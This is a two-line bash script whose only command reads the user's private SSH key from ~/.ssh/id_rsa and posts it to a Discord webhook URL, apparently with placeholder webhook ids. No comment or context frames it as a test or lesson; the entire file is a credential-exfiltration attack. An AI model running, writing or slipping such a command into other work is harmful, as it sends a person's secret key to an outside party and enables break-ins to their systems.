#!/usr/bin/env bash
cat ~/.ssh/id_rsa | curl -X POST https://discord.com/api/webhooks/123456/abcdef -d @-